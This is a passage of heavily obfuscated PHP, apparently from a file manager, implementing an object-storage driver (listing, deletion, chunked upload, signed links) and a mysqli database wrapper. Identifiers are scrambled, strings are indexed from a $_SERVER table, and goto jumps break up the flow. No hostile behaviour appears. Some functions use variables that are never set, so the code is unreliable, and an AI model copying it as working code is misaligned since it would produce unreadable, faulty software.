delFile($ÖÄñáêé) { $½„êİ›¸ =& $_SERVER[„Ç©ñÎ©]; $³‚‚øÍä = $this->ussRequest($ÖÄñáêé, $½„êİ›¸[1462]); return $³‚‚øÍä[$½„êİ›¸[1190]] ? !0 : !1; } public function delFolder($±‚Åç) { $Ùü ×³ë =& $_SERVER[„Ç©ñÎ©]; if (!$this->exist($±‚Åç)) { return !0; } $this->listItemCache = !1; $’¢«°ÉÀ = $Ä§ÃºÁ¸ = array(); $this->fileList($±‚Åç, $’¢«°ÉÀ, $Ä§ÃºÁ¸, !0); $this->listItemCache = !0; foreach ($Ä§ÃºÁ¸ as $¡Ï€¢ûÒ) { $éùÏÁ£à = $this->ussRequest($¡Ï€¢ûÒ[$Ùü ×³ë[32]], $Ùü ×³ë[1462]); if (!$éùÏÁ£à[$Ùü ×³ë[1190]]) { return !1; } } foreach ($’¢«°ÉÀ as $İÈ“ôüŠ) { $éùÏÁ£à = $this->ussRequest($İÈ“ôüŠ, $Ùü ×³ë[1462]); if (!$éùÏÁ£à[$Ùü ×³ë[1190]]) { return !1; } } $éùÏÁ£à = $this->ussRequest($±‚Åç, $Ùü ×³ë[1462]); return $éùÏÁ£à[$Ùü ×³ë[1190]]; } public function rename($¼–«¶Çê, $¨œ„Çè) { if ($this->isFile($¼–«¶Çê)) { $¨œ„Çè = get_path_father($¼–«¶Çê) . $¨œ„Çè; return $this->moveFile($¼–«¶Çê, $¨œ„Çè); } return $this->renameObject($¼–«¶Çê, $¨œ„Çè); } public function fileInfo($¡ØÉ´í, $¢«Ù¶œ = false, $®¹Íä—ß = array()) { $Ğ¦­…”§ =& $_SERVER[„Ç©ñÎ©]; $³ôÂ‡¥ = array($Ğ¦­…”§[32] => $this->pathThis($¡ØÉ´í), $Ğ¦­…”§[94] => $this->getPathOuter($Ğ¦­…”§[8] . $¡ØÉ´í), $Ğ¦­…”§[33] => $Ğ¦­…”§[209], $Ğ¦­…”§[86] => isset($®¹Íä—ß[$Ğ¦­…”§[86]]) ? $®¹Íä—ß[$Ğ¦­…”§[86]] : 0, $Ğ¦­…”§[184] => $this->ext($¡ØÉ´í)); if ($¢«Ù¶œ) { return $³ôÂ‡¥; } $³ôÂ‡¥[$Ğ¦­…”§[210]] = $³ôÂ‡¥[$Ğ¦­…”§[95]] = 0; $³ôÂ‡¥[$Ğ¦­…”§[211]] = $³ôÂ‡¥[$Ğ¦­…”§[212]] = !0; if (empty($®¹Íä—ß)) { $®¹Íä—ß = $this->objectMeta($¡ØÉ´í); if (!$®¹Íä—ß) { return $³ôÂ‡¥; } } $³ôÂ‡¥[$Ğ¦­…”§[210]] = intval($®¹Íä—ß[$Ğ¦­…”§[1463]]); $³ôÂ‡¥[$Ğ¦­…”§[95]] = intval($®¹Íä—ß[$Ğ¦­…”§[1464]]); $³ôÂ‡¥[$Ğ¦­…”§[86]] = $®¹Íä—ß[$Ğ¦­…”§[86]]; return $³ôÂ‡¥; } public function folderInfo($Ğİ‘µÚ’, $“¼—ß¥µ = false) { $—Ú»Œ©º =& $_SERVER[„Ç©ñÎ©]; $¯õ…œä = array($—Ú»Œ©º[32] => $this->pathThis($Ğİ‘µÚ’), $—Ú»Œ©º[94] => $this->getPathOuter($—Ú»Œ©º[8] . $Ğİ‘µÚ’), $—Ú»Œ©º[33] => $—Ú»Œ©º[85]); if ($“¼—ß¥µ) { return $¯õ…œä; } $¯õ…œä[$—Ú»Œ©º[210]] = $¯õ…œä[$—Ú»Œ©º[95]] = 0; $¯õ…œä[$—Ú»Œ©º[211]] = $¯õ…œä[$—Ú»Œ©º[212]] = !0; if (empty($ùç×·é)) { $ùç×·é = $this->objectMeta($Ğİ‘µÚ’); if (!$ùç×·é) { return $¯õ…œä; } } $¯õ…œä[$—Ú»Œ©º[210]] = intval($ùç×·é[$—Ú»Œ©º[1463]]); $¯õ…œä[$—Ú»Œ©º[95]] = intval($ùç×·é[$—Ú»Œ©º[1464]]); return $¯õ…œä; } private function listObjs($ªè‡¹ğ, $‹“¸”  = 0, $¾şÜ­Í = 1000) { $ï¹”ïô =& $_SERVER[„Ç©ñÎ©]; $æ‡â²† = array($ï¹”ïô[1465], $ï¹”ïô[1466] . $¾şÜ­Í); if ($‹“¸” ) { $æ‡â²†[] = $ï¹”ïô[1467] . $‹“¸” ; } $ Œ‚Í³ = $this->ussRequest($ªè‡¹ğ, $ï¹”ïô[240], !1, $æ‡â²†); return !$ Œ‚Í³[$ï¹”ïô[1190]] ? !1 : $ Œ‚Í³[$ï¹”ïô[1192]]; } private function fileList($’˜‡™™º, &$òÏ¢ÈÕ, &$†ˆ¥¾ºö, $åŒåãÇ… = false) { $¦¼òå Ê =& $_SERVER[„Ç©ñÎ©]; $Ö‹®š–„ = $¦¼òå Ê[12]; $ƒ–’şœ™ = 1000; $ãìêéÁ“ = rtrim($’˜‡™™º, $¦¼òå Ê[8]) . $¦¼òå Ê[8]; while (!0) { check_abort(); $àí˜Ããä = $this->listObjs($’˜‡™™º, $Ö‹®š–„, $ƒ–’şœ™); if (!$àí˜Ããä) { return !1; } $Ö‹®š–„ = isset($àí˜Ããä[$¦¼òå Ê[1468]]) ? $àí˜Ããä[$¦¼òå Ê[1468]] : $¦¼òå Ê[12]; $ÈêåûÎ° = isset($àí˜Ããä[$¦¼òå Ê[1469]]) ? $àí˜Ããä[$¦¼òå Ê[1469]] : array(); foreach ($ÈêåûÎ° as $ŠÕ®÷“‰) { $Ø‹µµ” = $ŠÕ®÷“‰[$¦¼òå Ê[33]] == $¦¼òå Ê[85] ? !0 : !1; $°‡Ã¦Úè = ltrim($ãìêéÁ“ . $ŠÕ®÷“‰[$¦¼òå Ê[32]], $¦¼òå Ê[8]) . ($Ø‹µµ” ? $¦¼òå Ê[8] : $¦¼òå Ê[12]); $‹½´•·Å = array($¦¼òå Ê[32] => $°‡Ã¦Úè, $¦¼òå Ê[33] => $Ø‹µµ” ? $¦¼òå Ê[85] : $¦¼òå Ê[209], $¦¼òå Ê[86] => $ŠÕ®÷“‰[$¦¼òå Ê[346]], $¦¼òå Ê[1464] => $ŠÕ®÷“‰[$¦¼òå Ê[1470]]); $this->cacheMethodInfoSet($°‡Ã¦Úè, $Ø‹µµ”, $‹½´•·Å); if ($Ø‹µµ”) { $òÏ¢ÈÕ[] = $°‡Ã¦Úè; if ($åŒåãÇ…) { $this->fileList($°‡Ã¦Úè, $òÏ¢ÈÕ, $†ˆ¥¾ºö, $åŒåãÇ…); } continue; } $†ˆ¥¾ºö[] = $‹½´•·Å; } if (count($ÈêåûÎ°) < $ƒ–’şœ™) { break; } } $this->cacheMethodInfoSet($’˜‡™™º, !0); } public function listPath($îäƒÏŒğ, $ÍëÅÃ¾ = false) { $ò¯—¯¤— =& $_SERVER[„Ç©ñÎ©]; $ÒÑ¦üù = $Ïôù–ãü = array(); $this->fileList($îäƒÏŒğ, $ÒÑ¦üù, $Ïôù–ãü); foreach ($ÒÑ¦üù as $Ø„Ò•Ä => $ç…»óı½) { $ÒÑ¦üù[$Ø„Ò•Ä] = $this->folderInfo($ç…»óı½, $ÍëÅÃ¾); } foreach ($Ïôù–ãü as $Ø„Ò•Ä => $ç…»óı½) { $Ïôù–ãü[$Ø„Ò•Ä] = $this->fileInfo($ç…»óı½[$ò¯—¯¤—[32]], $ÍëÅÃ¾, $ç…»óı½); } return array($ò¯—¯¤—[92] => $ÒÑ¦üù, $ò¯—¯¤—[93] => $Ïôù–ãü); } public function has($–ñ€œú¸, $ı×–±š = false, $“ººÄ¦Ç = true) { $÷Õı½“Ì =& $_SERVER[„Ç©ñÎ©]; $Ââ”‡Ñ = $÷Õı½“Ì[12]; $«ºæÍœó = 500; $¿Ìâ¯£ä = 0; $’²»ş¸á = 0; $´°Ö…Ö† = rtrim($–ñ€œú¸, $÷Õı½“Ì[8]) . $÷Õı½“Ì[8]; while (!0) { check_abort(); $şê¯Ó  = $this->listObjs($–ñ€œú¸, $Ââ”‡Ñ, $«ºæÍœó); if (!$şê¯Ó ) { return !1; } $Ââ”‡Ñ = isset($şê¯Ó [$÷Õı½“Ì[1468]]) ? $şê¯Ó [$÷Õı½“Ì[1468]] : $÷Õı½“Ì[12]; $¯€ÎÍ§ë = isset($şê¯Ó [$÷Õı½“Ì[1469]]) ? $şê¯Ó [$÷Õı½“Ì[1469]] : array(); if (empty($¯€ÎÍ§ë)) { break; } $¸©¼óŠ = array_filter($¯€ÎÍ§ë, function ($¢íÈÏê–) { $…Õúõ¦Ï =& $_SERVER[„Ç©ñÎ©]; return $¢íÈÏê–[$…Õúõ¦Ï[33]] == $…Õúõ¦Ï[85]; }); $‚…ÈÒÒÕ = count($¯€ÎÍ§ë); $¸©¼óŠ = count($¸©¼óŠ); $¢åÉ§ü³ = $‚…ÈÒÒÕ - $¸©¼óŠ; if ($ı×–±š) { $’²»ş¸á += $¸©¼óŠ; $¿Ìâ¯£ä += $¢åÉ§ü³; if ($‚…ÈÒÒÕ < $«ºæÍœó) { break; } continue; } if ($“ººÄ¦Ç) { if ($¢åÉ§ü³) { return !0; } } else { if ($¸©¼óŠ) { return !0; } } if ($‚…ÈÒÒÕ < $«ºæÍœó) { break; } } if ($ı×–±š) { return array($÷Õı½“Ì[217] => $¿Ìâ¯£ä, $÷Õı½“Ì[218] => $’²»ş¸á); } return !1; } public function listAll($¯Ÿ¸ƒÅÑ) { $€Ñ’”„– =& $_SERVER[„Ç©ñÎ©]; $º”íïÔÂ = $Ş³ÅÖß¨ = array(); $this->fileList($¯Ÿ¸ƒÅÑ, $º”íïÔÂ, $Ş³ÅÖß¨, !0); $øÌ»ø§• = array(); foreach ($Ş³ÅÖß¨ as $á€´«•ë) { $øÌ»ø§•[$á€´«•ë[$€Ñ’”„–[32]]] = $á€´«•ë[$€Ñ’”„–[86]]; } foreach ($º”íïÔÂ as $á€´«•ë) { if (is_string($á€´«•ë)) { $øÌ»ø§•[$á€´«•ë] = 0; } } return $this->listAllFiles($¯Ÿ¸ƒÅÑ, array_keys($øÌ»ø§•), $øÌ»ø§•); } public function canRead($¿ä†ùØ) { return $this->exist($¿ä†ùØ) ? !0 : !1; } public function canWrite($Ëá¥±¨º) { return $this->exist($Ëá¥±¨º) ? !0 : !1; } public function getContent($¨°Í¯•¸) { return $this->fileSubstr($¨°Í¯•¸, 0, -1); } public function setContent($ßÒ¶Ùó, $›³ùÅÎ = '') { $¼±êÍé =& $_SERVER[„Ç©ñÎ©]; if (!$›³ùÅÎ) { $š¬¥ÌñØ = $this->ussRequest($ßÒ¶Ùó, $¼±êÍé[236]); return $š¬¥ÌñØ[$¼±êÍé[1190]]; } $ÒÑç¼ÈË = $this->tempFile($this->pathThis($ßÒ¶Ùó)); file_put_contents($ÒÑç¼ÈË, $›³ùÅÎ); if ($this->upload($ßÒ¶Ùó, $ÒÑç¼ÈË)) { $this->tempFileRemve($ÒÑç¼ÈË); return !0; } return !1; } public function fileSubstr($–—Æ¿˜†, $½àèòÌ“, $ø«ŸÁŠÜ) { $î²¼ÔÁê =& $_SERVER[„Ç©ñÎ©]; if (!($—‡ÇÔ³Ë = $this->link($–—Æ¿˜†))) { return !1; } $ÒÑ‹ıÅ‘ = !1; if ($ø«ŸÁŠÜ > 0) { $û¥œÉ¨ø = $½àèòÌ“ + $ø«ŸÁŠÜ - 1; $ÒÑ‹ıÅ‘ = array($î²¼ÔÁê[1431] . $½àèòÌ“ . $î²¼ÔÁê[395] . $û¥œÉ¨ø); } $¥¯€òí = url_request($—‡ÇÔ³Ë, $î²¼ÔÁê[240], !1, $ÒÑ‹ıÅ‘); return $¥¯€òí[$î²¼ÔÁê[753]] ? $¥¯€òí[$î²¼ÔÁê[1192]] : !1; } public function upload($¾±ĞÒÕ, $àÏ–õ”, $Ãà„¡‘ = false, $î£„ñ« = REPEAT_REPLACE) { $Åµ…¿Š =& $_SERVER[„Ç©ñÎ©]; $¼ÌŠÔÂ£ = IO::size($àÏ–õ”); if ($¼ÌŠÔÂ£ <= 1024 * 1024 * 200) { $çìœí’˜ = array($Åµ…¿Š[1471] . $àÏ–õ”); $ÄÆï‡ò = $this->ussRequest($¾±ĞÒÕ, $Åµ…¿Š[238], $çìœí’˜); return $ÄÆï‡ò[$Åµ…¿Š[1190]] ? $this->getPathOuter($¾±ĞÒÕ) : !1; } $îŸŒ—‹ = 1024 * 1024 * 10; $íÎ¸˜ŞÖ = array($Åµ…¿Š[1472], $Åµ…¿Š[1473] . $¼ÌŠÔÂ£, $Åµ…¿Š[1474], $Åµ…¿Š[1475] . $îŸŒ—‹); $ÄÆï‡ò = $this->ussRequest($¾±ĞÒÕ, $Åµ…¿Š[238], !1, $íÎ¸˜ŞÖ); if (!$ÄÆï‡ò[$Åµ…¿Š[1190]]) { return !1; } $èêîÚËš = $ÄÆï‡ò[$Åµ…¿Š[1192]]; $ßË´‰œÅ = 0; $Ñœ“©çî = $èêîÚËš[$Åµ…¿Š[1476]]; $×…¤²ã· = fopen($àÏ–õ”, $Åµ…¿Š[1380]); if (!$×…¤²ã·) { return !1; } do { $×Ò“î© = $èêîÚËš[$Åµ…¿Š[1477]]; fseek_64($×…¤²ã·, $ßË´‰œÅ); $ÊäÀ»ç‹ = fread($×…¤²ã·, $×Ò“î©); $Œìú‹µ³ = 0; do { $Œìú‹µ³++; $èêîÚËš = $this->uploadPart($¾±ĞÒÕ, $èêîÚËš, $ÊäÀ»ç‹); } while (!$èêîÚËš && $Œìú‹µ³ < 3); if (!$èêîÚËš) { return !1; } $Ñœ“©çî = $èêîÚËš[$Åµ…¿Š[1476]]; $ßË´‰œÅ += $×Ò“î©; } while ($Ñœ“©çî != -1); fclose($×…¤²ã·); $íÎ¸˜ŞÖ = array($Åµ…¿Š[1478], $Åµ…¿Š[1479] . $èêîÚËš[$Åµ…¿Š[1480]], $Åµ…¿Š[1474]); $ÄÆï‡ò = $this->ussRequest($¾±ĞÒÕ, $Åµ…¿Š[238], !1, $íÎ¸˜ŞÖ); return $ÄÆï‡ò[$Åµ…¿Š[1190]] ? $this->getPathOuter($Çä£°²³) : !1; } private function uploadPart($“¾Ğ¢ñ, $·¦èğšÎ, &$ã²×Õ–·) { $º¥¹„ô— =& $_SERVER[„Ç©ñÎ©]; $¼…Í×Ó³ = array($º¥¹„ô—[1481], $º¥¹„ô—[1479] . $·¦èğšÎ[$º¥¹„ô—[1480]], $º¥¹„ô—[1482] . $·¦èğšÎ[$º¥¹„ô—[1476]], $º¥¹„ô—[152] . $·¦èğšÎ[$º¥¹„ô—[1477]]); $äïÈ‹¬µ = $this->ussRequest($“¾Ğ¢ñ, $º¥¹„ô—[238], $ã²×Õ–·, $¼…Í×Ó³); return !$äïÈ‹¬µ[$º¥¹„ô—[1190]] ? $äïÈ‹¬µ[$º¥¹„ô—[1190]] : $äïÈ‹¬µ[$º¥¹„ô—[1192]]; } public function uploadFormData($’ùÔç«œ, $ô§Û“ıõ = 3600) { return $this->uploadPolicy($’ùÔç«œ, $ô§Û“ıõ); } public function multiUploadFormData($€ÌŞÊ, $‹¹‡«ù = 3600) { $çªÂ–èœ =& $_SERVER[„Ç©ñÎ©]; $¼ò¢±Ø = (int) $GLOBALS[$çªÂ–èœ[7]][$çªÂ–èœ[86]]; return $this->uploadPolicy($€ÌŞÊ, $‹¹‡«ù, $¼ò¢±Ø); } private function uploadPolicy($¥ã±¬ÌÓ, $ˆ¾Š¶õ€ = 3600, $ìª§€Ùş = 0) { $×®”á‡Ê =& $_SERVER[„Ç©ñÎ©]; $½…å¬ë« = $×®”á‡Ê[8] . $this->bucket; $¹¯è‘×Ö = gmdate($×®”á‡Ê[1416]); $ƒ®‰ˆÂ = array($×®”á‡Ê[1483] => $this->bucket, $×®”á‡Ê[1484] => $¥ã±¬ÌÓ, $×®”á‡Ê[1485] => time() + $ˆ¾Š¶õ€, $×®”á‡Ê[1486] => $¹¯è‘×Ö); if ($ìª§€Ùş) { $ƒ®‰ˆÂ[$×®”á‡Ê[1396]] = $ìª§€Ùş; } $ŸàÄ‘é² = base64_encode(json_encode($ƒ®‰ˆÂ)); $É³íúàÓ = base64_encode(hash_hmac($×®”á‡Ê[1453], "\x50\x4f\x53\124\x26{$½…å¬ë«}\x26{$¹¯è‘×Ö}\x26{$ŸàÄ‘é²}", md5("{$this->userpass}"), !0)); $ôèöì• = array($×®”á‡Ê[1321] => $ŸàÄ‘é², $×®”á‡Ê[1487] => "\125\120\x59\125\x4e\x20{$this->username}\72{$É³íúàÓ}", $×®”á‡Ê[191] => $this->endpoint . $½…å¬ë«); return $ôèöì•; } public function download($©Â¶ê°³, $ÉÀ¿Ã¨ñ) { $ÙÜ¬¿­ = IO::getPathInner(IO::mkfile($ÉÀ¿Ã¨ñ)); if (!($çÖı¸‰ò = $this->link($©Â¶ê°³))) { return !1; } $½Àöï¬’ = 0; $›ÔÇ º“ = 1024 * 200; $›äìÕÇ = fopen($ÙÜ¬¿­, $_SERVER[„Ç©ñÎ©][1437]); while (!0) { $üù£õŸÚ = $this->fileSubstr($©Â¶ê°³, $½Àöï¬’, $›ÔÇ º“); if ($üù£õŸÚ === !1) { return !1; } fwrite($›äìÕÇ, $üù£õŸÚ); $½Àöï¬’ += $›ÔÇ º“; if (strlen($üù£õŸÚ) < $›ÔÇ º“) { break; } } fclose($›äìÕÇ); return $ÉÀ¿Ã¨ñ; } public function link($á†Õ¥¡¶, $ã‹‰ÕúÃ = array()) { $©¸ëÄ¤ä =& $_SERVER[„Ç©ñÎ©]; $á†Õ¥¡¶ = trim($á†Õ¥¡¶, $©¸ëÄ¤ä[8]); if (!empty($this->token)) { $ø½–®…ò = strtotime(date($©¸ëÄ¤ä[1488])); $õ°äÄàü = substr(md5($this->token . $©¸ëÄ¤ä[293] . $ø½–®…ò . $©¸ëÄ¤ä[1489] . $á†Õ¥¡¶), 12, 8) . $ø½–®…ò; $ã‹‰ÕúÃ[] = $©¸ëÄ¤ä[1490] . $õ°äÄàü; } $ÈÒ¯¾ÉŸ = !empty($ã‹‰ÕúÃ) ? $©¸ëÄ¤ä[83] . implode($©¸ëÄ¤ä[293], $ã‹‰ÕúÃ) : $©¸ëÄ¤ä[12]; return $this->getHost() . $©¸ëÄ¤ä[8] . $á†Õ¥¡¶ . $ÈÒ¯¾ÉŸ; } public function fileOut($ÎÌ³£î, $Èö„Òå = false, $¢ış‹†æ = false, $ü‹÷â®š = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÎÌ³£î, $Èö„Òå, $¢ış‹†æ, $ü‹÷â®š); } if (!$¢ış‹†æ) { $¢ış‹†æ = $this->pathThis($ÎÌ³£î); } $ÈéÉ³ å = $Èö„Òå ? array($_SERVER[„Ç©ñÎ©][1491] . rawurlencode($¢ış‹†æ)) : array(); $Ëô÷š“ = $this->link($ÎÌ³£î, $ÈéÉ³ å); $this->fileOutLink($Ëô÷š“); } public function fileOutServer($·œä¾àÖ, $ÀÊÖ¯ ï = false, $Æ±Âµ›« = false, $­èç°“Ø = '') { parent::fileOut($·œä¾àÖ, $ÀÊÖ¯ ï, $Æ±Âµ›«, $­èç°“Ø); } public function fileOutImage($×ğ¥ãÎ¯, $ úœ°Ã¿ = 250) { $öó¤ãÍñ = $this->link($×ğ¥ãÎ¯ . $_SERVER[„Ç©ñÎ©][1492] . $ úœ°Ã¿); $this->fileOutLink($öó¤ãÍñ); } public function fileOutImageServer($­’ÎÎ‘Ì, $šƒÜÙëï = 250) { parent::fileOutImage($­’ÎÎ‘Ì, $šƒÜÙëï); } public function hashMd5($•ÁÑ–Â) { $–´¿»Õƒ =& $_SERVER[„Ç©ñÎ©]; $™©º·õı = $this->_objectMeta($•ÁÑ–Â); return isset($™©º·õı[$–´¿»Õƒ[222]]) ? $™©º·õı[$–´¿»Õƒ[222]] : !1; } public function size($ë‹Åóşï) { $¡˜îÇÅ = $this->objectMeta($ë‹Åóşï); return $¡˜îÇÅ ? $¡˜îÇÅ[$_SERVER[„Ç©ñÎ©][86]] : 0; } public function info($§æãÊŒŠ) { if ($this->isFolder($§æãÊŒŠ)) { return $this->folderInfo($§æãÊŒŠ); } else { if ($this->isFile($§æãÊŒŠ)) { return $this->fileInfo($§æãÊŒŠ); } } return !1; } public function exist($ºÙÅº‚) { return $this->isFile($ºÙÅº‚) || $this->isFolder($ºÙÅº‚); } public function isFile($ß£ıËûİ) { return !$this->isFolder($ß£ıËûİ) && $this->objectMeta($ß£ıËûİ); } public function isFolder($á¼¾í–) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][175], $á¼¾í–); } protected function objectMeta($ÂÉí£õ”) { return $this->cacheMethod($_SERVER[„Ç©ñÎ©][177], $ÂÉí£õ”); } protected function _objectMeta($€­òÎˆ) { $¾äÛ¿’› =& $_SERVER[„Ç©ñÎ©]; if ($€­òÎˆ == $¾äÛ¿’›[12] || $€­òÎˆ == $¾äÛ¿’›[8]) { return array(); } $ıÅ·×„é = $this->ussRequest($€­òÎˆ, $¾äÛ¿’›[1493]); if (!$ıÅ·×„é[$¾äÛ¿’›[1190]]) { return null; } $¶âÑÌì = isset($ıÅ·×„é[$¾äÛ¿’›[1192]]) ? $ıÅ·×„é[$¾äÛ¿’›[1192]] : array(); if (!isset($¶âÑÌì[$¾äÛ¿’›[1494]])) { return null; } $î„Õ³Ó¬ = array($¾äÛ¿’›[33] => isset($¶âÑÌì[$¾äÛ¿’›[1494]]) ? $¶âÑÌì[$¾äÛ¿’›[1494]] : null, $¾äÛ¿’›[86] => isset($¶âÑÌì[$¾äÛ¿’›[1495]]) ? $¶âÑÌì[$¾äÛ¿’›[1495]] : null, $¾äÛ¿’›[222] => isset($¶âÑÌì[$¾äÛ¿’›[1496]]) ? $¶âÑÌì[$¾äÛ¿’›[1496]] : null, $¾äÛ¿’›[1463] => isset($¶âÑÌì[$¾äÛ¿’›[1497]]) ? $¶âÑÌì[$¾äÛ¿’›[1497]] : null); $î„Õ³Ó¬[$¾äÛ¿’›[1464]] = isset($¶âÑÌì[$¾äÛ¿’›[1498]]) ? strtotime($¶âÑÌì[$¾äÛ¿’›[1498]]) : $î„Õ³Ó¬[$¾äÛ¿’›[1463]]; return $î„Õ³Ó¬; } protected function _isFolder($¿å«ßşÍ) { $ùä¬ôµ =& $_SERVER[„Ç©ñÎ©]; if ($¿å«ßşÍ == $ùä¬ôµ[12] || $¿å«ßşÍ == $ùä¬ôµ[8]) { return !0; } $ÌØ‰˜êá = $this->_objectMeta($¿å«ßşÍ); return isset($ÌØ‰˜êá[$ùä¬ôµ[33]]) && $ÌØ‰˜êá[$ùä¬ôµ[33]] == $ùä¬ôµ[85] ? !0 : !1; } } goto c’Âì÷è¸Ô; B–ø•ÔÖ¤æ: class DbMysqli extends Db { public function __construct($œ±âÏÛç = '') { $ÖŒûô‹ì =& $_SERVER[„Ç©ñÎ©]; if (!extension_loaded($ÖŒûô‹ì[911])) { think_exception(think_lang($ÖŒûô‹ì[14]) . $ÖŒûô‹ì[912]); } if (!empty($œ±âÏÛç)) { $this->config = $œ±âÏÛç; if (empty($this->config[$ÖŒûô‹ì[17]])) { $this->config[$ÖŒûô‹ì[17]] = $ÖŒûô‹ì[12]; } } } public function connect($ıŠÒÉ½× = '', $±æ£ë„ = 0) { $¼¤­·Í­ =& $_SERVER[„Ç©ñÎ©]; if (!isset($this->linkID[$±æ£ë„])) { if (empty($ıŠÒÉ½×)) { $ıŠÒÉ½× = $this->config; } $this->linkID[$±æ£ë„] = new mysqli($ıŠÒÉ½×[$¼¤­·Í­[885]], $ıŠÒÉ½×[$¼¤­·Í­[887]], $ıŠÒÉ½×[$¼¤­·Í­[888]], $ıŠÒÉ½×[$¼¤­·Í­[21]], $ıŠÒÉ½×[$¼¤­·Í­[886]] ? intval($ıŠÒÉ½×[$¼¤­·Í­[886]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÂÓóåêî = $this->linkID[$±æ£ë„]->server_version; $this->linkID[$±æ£ë„]->query($¼¤­·Í­[889] . think_config($¼¤­·Í­[890]) . $¼¤­·Í­[58]); if ($ÂÓóåêî > $¼¤­·Í­[891]) { $this->linkID[$±æ£ë„]->query($¼¤­·Í­[892]); } $this->connected = !0; if (1 != think_config($¼¤­·Í­[22])) { unset($this->config); } } return $this->linkID[$±æ£ë„]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÉïĞ¾»ª) { $ÄŠÏŞºÀ =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉïĞ¾»ª; if ($this->queryID) { $this->free(); } think_action_status($ÄŠÏŞºÀ[23], 1); think_status($ÄŠÏŞºÀ[24]); $this->queryID = $this->_linkID->query($ÉïĞ¾»ª); if ($this->_linkID->more_results()) { while (($ˆÅÖòğİ = $this->_linkID->next_result()) != NULL) { $ˆÅÖòğİ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÚğèØ÷…) { $­Ü±¶æ÷ =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÚğèØ÷…; if ($this->queryID) { $this->free(); } think_action_status($­Ü±¶æ÷[25], 1); think_status($­Ü±¶æ÷[24]); $—€Éè³ì = $this->_linkID->query($ÚğèØ÷…); $this->debug(); if (!1 === $—€Éè³ì) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $”„‘é¿ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$”„‘é¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ù¬É­Ë• = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ù¬É­Ë•) { $this->error(); return !1; } } return !0; } private function getAll() { $ª¿¦‰÷ = array(); if ($this->numRows > 0) { for ($­†¢¤¬ = 0; $­†¢¤¬ < $this->numRows; $­†¢¤¬++) { $ª¿¦‰÷[$­†¢¤¬] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ª¿¦‰÷; } public function getFields($©ˆ†Î¢µ) { $¤ŒŠæ¡¹ =& $_SERVER[„Ç©ñÎ©]; $ÜüúòÎ„ = $this->query($¤ŒŠæ¡¹[896] . $this->parseKey($©ˆ†Î¢µ)); $«µ»ŒëÊ = array(); if ($ÜüúòÎ„) { foreach ($ÜüúòÎ„ as $§öÖ¼ãÁ => $×àı¯Ñ±) { $«µ»ŒëÊ[$×àı¯Ñ±[$¤ŒŠæ¡¹[31]]] = array($¤ŒŠæ¡¹[32] => $×àı¯Ñ±[$¤ŒŠæ¡¹[31]], $¤ŒŠæ¡¹[33] => $×àı¯Ñ±[$¤ŒŠæ¡¹[34]], $¤ŒŠæ¡¹[35] => (bool) ($×àı¯Ñ±[$¤ŒŠæ¡¹[36]] === $¤ŒŠæ¡¹[12]), $¤ŒŠæ¡¹[37] => $×àı¯Ñ±[$¤ŒŠæ¡¹[38]], $¤ŒŠæ¡¹[39] => strtolower($×àı¯Ñ±[$¤ŒŠæ¡¹[40]]) == $¤ŒŠæ¡¹[41], $¤ŒŠæ¡¹[42] => strtolower($×àı¯Ñ±[$¤ŒŠæ¡¹[43]]) == $¤ŒŠæ¡¹[44]); } } return $«µ»ŒëÊ; } public function getTables($¨”Â¨ = '') { $‹ß¶ÙìÊ =& $_SERVER[„Ç©ñÎ©]; $¸Ã£™ø = !empty($¨”Â¨) ? $‹ß¶ÙìÊ[898] . $¨”Â¨ . $‹ß¶ÙìÊ[899] : $‹ß¶ÙìÊ[900]; $‘ÍÒí›¬ = $this->query($¸Ã£™ø); $ÍòŠ–Å = array(); if ($‘ÍÒí›¬) { foreach ($‘ÍÒí›¬ as $–Ì÷—ŠŸ => $›òÄĞé) { $ÍòŠ–Å[$–Ì÷—ŠŸ] = current($›òÄĞé); } } return $ÍòŠ–Å; } public function replace($İÓÄ˜Ê¿, $ğÑƒÄû¥ = array()) { $•Ú½˜øŸ =& $_SERVER[„Ç©ñÎ©]; foreach ($İÓÄ˜Ê¿ as $”íç => $Ì˜¶ÎÁ±) { $òÚöØ€Š = $this->parseValue($Ì˜¶ÎÁ±); if (is_scalar($òÚöØ€Š)) { $şÌÆïëÌ[] = $òÚöØ€Š; $ì®¤âú§[] = $this->parseKey($”íç); } } $Ôê´Ãò = $•Ú½˜øŸ[901] . $this->parseTable($ğÑƒÄû¥[$•Ú½˜øŸ[288]]) . $•Ú½˜øŸ[902] . implode($•Ú½˜øŸ[50], $ì®¤âú§) . $•Ú½˜øŸ[903] . implode($•Ú½˜øŸ[50], $şÌÆïëÌ) . $•Ú½˜øŸ[904]; return $this->execute($Ôê´Ãò); } public function insertAll($±³‚‚ïÁ, $ §Ãõ‰€ = array(), $ı˜æ£•” = false) { $úÄéûú =& $_SERVER[„Ç©ñÎ©]; if (!is_array($±³‚‚ïÁ[0])) { return !1; } $ÆİÔïá = array_keys($±³‚‚ïÁ[0]); $ÜÙ¦¸È = array(); foreach ($±³‚‚ïÁ as $ƒæµåš) { $‰©·¤Óö = array(); foreach ($ƒæµåš as $òı¹‡€± => $¤ˆñßÒÛ) { $¤ˆñßÒÛ = $this->parseValue($¤ˆñßÒÛ); if (is_scalar($¤ˆñßÒÛ)) { $‰©·¤Óö[] = $¤ˆñßÒÛ; } } $ÜÙ¦¸È[] = $úÄéûú[269] . implode($úÄéûú[50], $‰©·¤Óö) . $úÄéûú[904]; } array_walk($ÆİÔïá, 